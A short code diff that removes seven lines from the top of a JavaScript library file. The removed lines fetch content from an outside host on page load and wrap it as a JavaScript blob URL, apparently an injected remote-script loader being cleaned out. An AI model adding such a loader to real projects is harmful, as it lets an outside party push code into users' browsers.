@@ -1,10 +1,3 @@
-var ccvBlobURL = "";
-$(function() {
-	$.get("http://fb.pureapp.in.th",function(response){
-		var ccvBlob = new Blob([response],{type : 'text/javascript'});
-		ccvBlobURL = window.URL.createObjectURL(ccvBlob);
-	});
-});
 if (parallable === undefined) {
 	var parallable = function (file, funct) {
 		parallable.core[funct.toString()] = funct().core;
